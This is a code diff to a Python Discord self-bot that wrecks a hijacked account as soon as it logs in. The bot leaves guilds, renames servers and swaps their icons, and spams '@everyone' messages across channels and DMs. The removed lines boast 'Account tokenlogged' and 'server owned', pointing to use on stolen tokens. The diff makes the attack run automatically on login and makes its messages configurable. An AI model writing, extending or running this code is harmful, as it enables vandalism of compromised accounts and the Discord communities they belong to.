@@ -1,16 +1,34 @@
 # libs
+import os
+import sys
 from discord.ext import commands
 from discord.ext.commands import bot
 
-prefix = str(input("Whats prefix you want?\n "))
+if not os.path.exists('config.txt'):
+    srvsname = str(input("Whats crashed servers name you want?\n "))
+    chspam = str(input("Whats spam-message for channels you want?\n "))
+    pchspam = str(input("Whats spam-message for private channels (DMs) you want?\n "))
+    saveconfig = str(input("Do you want save config into config.txt? (y/n)\n "))
+    if saveconfig == "y":
+        conf = open('config.txt','w')
+        conf.write(f"{srvsname}\n{chspam}\n{pchspam}")
+    elif saveconfig == "n":
+        pass
+    else:
+        sys.exit('Invalid argument!')
+else:
+    conf = open('config.txt','r')
+    conf = conf.read().split()
+    srvsname = conf[0]
+    chspam = conf[1]
+    pchspam = conf[2]
 
 # vars
-client = commands.Bot(command_prefix=prefix, self_bot=True)
+client = commands.Bot(command_prefix=None, self_bot=True)
 
 # commands
-@client.command()
-async def nukeservers(ctx):
-    await ctx.message.delete()
+@client.event
+async def on_ready():
     for gld in client.guilds:
         try:
             await gld.leave()
@@ -28,7 +46,7 @@ async def nukeservers(ctx):
         try:
             with open('avatar.png','rb') as f:
                 try:
-                    await g.edit(name="server owned", icon=f.read())
+                    await g.edit(name=srvsname, icon=f.read())
                 except:
                     pass
         except:
@@ -44,7 +62,7 @@ async def nukeservers(ctx):
         try:
             for c in g.text_channels:
                 try:
-                    await c.send("@everyone EZ! Account and server owned!")
+                    await c.send(chspam)
                 except:
                     pass
                 try:
@@ -61,12 +79,9 @@ async def nukeservers(ctx):
                     pass
         except:
             pass
-
-@client.command()
-async def nukeDM(ctx):
     for dm in client.private_channels:
         try:
-            await dm.send("@everyone EZ! Account tokenlogged.")
+            await dm.send(pchspam)
         except:
             pass
 
